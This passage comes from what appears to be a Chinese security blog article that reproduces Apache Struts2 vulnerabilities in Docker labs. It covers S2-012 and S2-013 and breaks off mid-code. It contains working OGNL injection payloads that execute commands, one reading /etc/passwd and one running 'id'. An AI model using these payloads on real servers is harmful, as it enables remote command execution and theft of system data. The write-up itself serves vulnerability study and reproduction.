10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;package</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"S2-012"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">extends</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"struts-default"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;action</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"user"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"com.demo.action.UserAction"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;result</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"redirect"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">type</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"redirect"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/index.jsp?name=${</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}&lt;/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">result</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;result</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"input"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/index.jsp</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/result&gt;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;result</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"success"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/index.jsp</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/result&gt;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/action&gt;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/package&gt;</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-012的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5770750988142292" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/20_CYfeXB3vnv1DVJXevnmT0RtQkx2jQg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wUmHRReKZqAeXAIksdoYfJVia6CYfeXB3vnv1DVJXevnmT0RtQkx2jQg/640?wx_fmt=png'" data-type="png" data-w="1012" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">直接在文本框内执行payload读取passwd</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ProcessBuilder</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">String</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[]{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"cat"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"/etc/passwd"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">})).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">redirectErrorStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">true</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">start</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">InputStreamReader</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">BufferedReader</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">e</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">char</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">50000</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">],#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">read</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">e</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">println</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">String</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">e</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">flush</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">close</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()}</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4153225806451613" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/21_hFbXHzwGTzTUgpzIorw6yQia8ZNvdQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wwWANLfianTxPaqliaQATvibSFpWqhFbXHzwGTzTUgpzIorw6yQia8ZNvdQ/640?wx_fmt=png'" data-type="png" data-w="496" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">点击提交即可读取到passwd</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5285388127853882" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/22_dI8VaaZfyWDZAOZM93G3zAH3kcaxng.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wBgtVzobicmNGYLp4vbmzQwukibdI8VaaZfyWDZAOZM93G3zAH3kcaxng/640?wx_fmt=png'" data-type="png" data-w="876" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-013</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：none - 链接不包含请求的任意参数值（默认） get - 链接只包含 GET 请求中的参数和其值 all - 链接包含 GET 和 POST 所有参数和其值 &lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-013的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5766634522661523" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/23_nI8TA2xeFJJqN8m47unIrN9iaAmwWg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wksOcoMztjl1k9kYsKjYQuvUmInI8TA2xeFJJqN8m47unIrN9iaAmwWg/640?wx_fmt=png'" data-type="png" data-w="1037" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里直接构造链接并进行url编码：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"allowStaticMethodAccess"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">true</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime@getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'id'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">InputStreamReader</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">c</span><span 